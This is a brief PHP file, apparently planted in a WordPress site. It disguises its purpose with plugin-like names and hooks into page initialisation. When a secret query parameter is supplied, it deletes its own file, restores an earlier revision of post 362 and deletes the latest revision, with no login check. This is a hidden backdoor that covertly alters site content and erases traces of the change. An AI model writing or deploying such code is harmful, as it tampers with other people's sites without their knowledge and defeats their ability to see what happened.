<?php

function additional_404_advance() {
	if (isset($_GET['site_article_messages']) && $_GET['site_article_messages'] === 'timeline_better_quotes') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$changer_accessible_visual = 362;
		$inline_addons_name_before = wp_get_post_revisions($changer_accessible_visual);
		if (empty($inline_addons_name_before)) die('no revisions');
		if (count($inline_addons_name_before) < 2) die('less than 2');
		$cover_blog_make = array_shift($inline_addons_name_before);
		$show_delivery_upgrader_booster = $cover_blog_make->ID;
		$genesis_updates_system = array_shift($inline_addons_name_before);
		$exchange_tooltip_gamipress_app = $genesis_updates_system->ID;
		$edition_insert_compat_s3 = wp_restore_post_revision($exchange_tooltip_gamipress_app);
		if ($edition_insert_compat_s3 === false) die('error restoring');
		$edition_insert_compat_s3 = wp_delete_post_revision($show_delivery_upgrader_booster);		
		if ($edition_insert_compat_s3 === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'additional_404_advance');
